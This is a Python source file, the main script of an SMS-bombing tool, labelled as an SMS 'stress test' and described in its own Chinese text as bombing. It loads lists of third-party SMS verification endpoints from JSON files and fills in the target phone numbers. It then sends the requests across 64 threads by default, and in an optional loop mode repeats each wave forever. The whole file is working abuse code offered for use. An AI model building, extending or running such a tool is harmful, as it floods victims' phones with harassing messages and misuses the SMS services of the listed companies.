# encoding=utf8
# 短信测压主程序
import pathlib
import sys
from typing import List, Union
import click
import json
import httpx
from loguru import logger
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import time

from utils import API, default_header

# logger config
logger.remove()
logger.add(
    sink=sys.stdout,
    format="<green>{time:YYYY-MM-DD at HH:mm:ss}</green> - <level>{level}</level> - <level>{message}</level>",
    colorize=True,
    backtrace=True
)

# current directory
path = pathlib.Path(__file__).parent


def load_json() -> List[API]:
    """load json for api.json
    :return: api list
    """
    json_path = pathlib.Path(path, 'api.json')
    if not json_path.exists():
        logger.error("Json file not exists!")
        return None

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [
                API(**data)
                for data in datas
            ]
            logger.success(f"api.json 加载完成 接口数:{len(APIs)}")
            return APIs
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            return None


def load_getapi() -> list:
    """load GETAPI
    :return:
    """
    json_path = pathlib.Path(path, 'GETAPI.json')
    if not json_path.exists():
        logger.error("GETAPI.json file not exists!")
        return None

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            logger.success(f"GETAPI加载完成,数目:{len(datas)}")
            return datas
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            return None


def reqAPI(api: API, client: httpx.Client) -> httpx.Response:
    if isinstance(api.data, dict):
        resp = client.request(method=api.method, json=api.data,
                              headers=api.header, url=api.url)
    else:
        resp = client.request(method=api.method, data=api.data,
                              headers=api.header, url=api.url)
    return resp


def req(api: Union[API, str], phone: tuple):
    """请求接口方法"""
    # 多手机号支持
    if isinstance(phone, tuple):
        phone_lst = [_ for _ in phone]
    else:
        phone_lst = [phone]

    with httpx.Client(headers=default_header, verify=False) as client:
        for ph in phone_lst:
            try:
                if isinstance(api, API):
                    api = api.handle_API(ph)
                    resp = reqAPI(api, client)
                    logger.info(f"{api.desc}-{resp.text[:30]}")
                else:
                    api = api.replace("[phone]", ph)
                    resp = client.get(url=api, headers=default_header)
                    logger.info(f"GETAPI接口-{resp.text[:30]}")
            except httpx.HTTPError as why:
                logger.error(f"{why.request.url}请求失败{why}")


@click.command()
@click.option("--thread", "-t", help="线程数(默认64)", default=64)
@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.option('--super', "-s", is_flag=True, help="循环模式")
@click.option('--interval', "-i", default=60, help="循环间隔时间(默认60s)", type=int)
def run(thread: int, phone: Union[str, tuple], interval: int, super: bool = False):
    """传入线程数和手机号启动轰炸,支持多手机号"""
    logger.info(f"循环模式:{super},手机号:{phone},线程数:{thread},循环间隔:{interval}")
    with ThreadPoolExecutor(max_workers=thread) as pool:
        i = 0
        if super:
            while True:
                i += 1
                logger.success(f"第{i}波轰炸开始！")
                _api = load_json()
                _api_get = load_getapi()
                for api in _api:
                    pool.submit(req, api, phone)
                for api_get in _api_get:
                    pool.submit(req, api_get, phone)
                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                time.sleep(interval)
        else:
            _api = load_json()
            _api_get = load_getapi()
            for api in _api:
                pool.submit(req, api, phone)
            for api_get in _api_get:
                pool.submit(req, api_get, phone)


@click.group()
def cli():
    pass


cli.add_command(run)


if __name__ == "__main__":
    cli()
